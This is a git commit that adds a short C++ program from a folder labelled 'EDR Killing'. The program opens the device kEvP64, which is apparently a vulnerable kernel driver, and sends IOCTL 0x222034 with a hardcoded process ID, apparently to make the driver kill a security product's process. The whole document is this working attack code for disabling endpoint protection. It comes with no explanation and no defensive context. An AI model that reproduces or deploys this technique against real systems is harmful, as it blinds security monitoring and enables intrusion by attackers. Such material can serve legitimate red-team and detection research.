1cc4530ce3ec22e5ab094f5251a3e124c9c7dae9
Jarno van den Brink <84376146+jarnovandenbrink@users.noreply.github.com>
2026-08-03 15:48:08 +0200

    Add files via upload

---
+++ 03. EDR Killing/02. kEvP64/kEvP64/kEvP64.cpp
@@ -0,0 +1,25 @@
+#include <Windows.h>
+#include <stdio.h>
+
+#define IOCTL_CODE 0x222034
+
+int main() {
+
+    DWORD bytesReturned;
+    int pid = 5016;
+
+    HANDLE hHandle = CreateFileA("\\\\.\\kEvP64", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+
+    if (hHandle == INVALID_HANDLE_VALUE) {
+        printf("[-] Failed to open device. Error: %lu\n", GetLastError());
+        return 1;
+    }
+    if (!DeviceIoControl(hHandle, IOCTL_CODE, &pid, sizeof(pid), &pid, sizeof(pid), &bytesReturned, NULL)) {
+        printf("[-] DeviceIoControl failed. Error: %lu\n", GetLastError());
+        CloseHandle(hHandle);
+        return 1;
+    }
+
+    CloseHandle(hHandle);
+    return 0;
+}
